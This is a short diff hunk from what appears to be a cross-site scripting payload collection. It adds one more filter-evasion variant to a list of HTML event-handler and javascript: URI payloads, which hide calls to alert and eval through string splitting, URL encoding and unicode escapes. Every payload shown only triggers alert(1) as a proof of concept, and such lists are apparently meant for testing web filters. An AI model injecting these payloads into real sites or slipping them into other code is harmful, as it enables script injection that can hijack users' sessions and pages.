@@ -14,6 +14,7 @@ windiow
 <details open ontoggle=top['al'%2B'ert'](1) >
 <iframe src="javascript:%61%6c%65%72%74%28%31%29">
  <details open ontoggle=top[a='al',b='ev',b%2ba]('alert(1)')>
+  <details open ontoggle=top[a='al',b='ev',b%2ba]('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')>
   
 <img src=1 onerror=location="javascript:alert(1)">
   <details open ontoggle=top[/al/.source+/ert/.source](8);>
